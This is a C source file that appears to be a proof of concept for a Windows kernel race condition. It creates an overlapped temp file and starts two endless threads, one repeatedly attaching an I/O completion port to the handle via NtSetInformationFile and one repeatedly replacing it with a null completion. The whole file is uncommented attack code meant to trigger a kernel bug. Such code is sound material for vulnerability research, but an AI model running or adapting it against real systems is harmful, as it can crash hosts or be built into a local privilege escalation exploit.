#include <stdio.h>
#include <windows.h>
#include "ntos.h"

#pragma comment(lib, "ntdll.lib")

HANDLE CreateFileHandleByAsyncIo() {
  CHAR temp_file_path[MAX_PATH];
  DWORD flags_and_attributes = FILE_FLAG_OVERLAPPED;

  GetTempPathA(MAX_PATH, temp_file_path);
  strcat_s(temp_file_path, "tmpFile");

  return CreateFileA(temp_file_path, FILE_GENERIC_READ | FILE_GENERIC_WRITE,
                     FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS,
                     flags_and_attributes, 0);
}

void ReplaceIoCompletionByNull(HANDLE FileHandle) {
  NTSTATUS status = 0;
  IO_STATUS_BLOCK io_status_block;
  FILE_COMPLETION_INFORMATION completion_info = {NULL, NULL};

  if (FileHandle == INVALID_HANDLE_VALUE) {
    return;
  }

  status = NtSetInformationFile(FileHandle, &io_status_block, &completion_info,
                                sizeof(FILE_COMPLETION_INFORMATION),
                                FileReplaceCompleteInformation);

  if (status < 0) {
    return;
  }
}

void SetIoCompletion(HANDLE FileHandle) {
  NTSTATUS status = 0;
  IO_STATUS_BLOCK io_status_block;
  FILE_COMPLETION_INFORMATION completion_info;
  HANDLE completion_handle = INVALID_HANDLE_VALUE;
  PVOID completion_key = NULL;

  status = NtCreateIoCompletion(&completion_handle, IO_COMPLETION_ALL_ACCESS,
                                NULL, 1);

  if (status < 0) {
    return;
  }

  completion_info.Port = completion_handle;
  completion_info.Key = NULL;

  status = NtSetInformationFile(FileHandle, &io_status_block, &completion_info,
                                sizeof(FILE_COMPLETION_INFORMATION),
                                FileCompletionInformation);

  if (status < 0) {
    return;
  }

  CloseHandle(completion_handle);
}

DWORD SetIoCompletionThread(LPVOID ThreadParam) {
  while (1) {
    SetIoCompletion(ThreadParam);
  }
  return 0;
}

DWORD ReplaceIoCompletionThread(LPVOID ThreadParam) {
  while (1) {
    ReplaceIoCompletionByNull(ThreadParam);
  }
  return 0;
}

void MainWork() {
  HANDLE file_handle = CreateFileHandleByAsyncIo();

  if (file_handle != INVALID_HANDLE_VALUE) {
    CloseHandle(
        CreateThread(NULL, 0, SetIoCompletionThread, file_handle, 0, NULL));
    CloseHandle(
        CreateThread(NULL, 0, ReplaceIoCompletionThread, file_handle, 0, NULL));
  }

  Sleep(INFINITE);
}

int main(int argc, CHAR** argv) {
  MainWork();
}
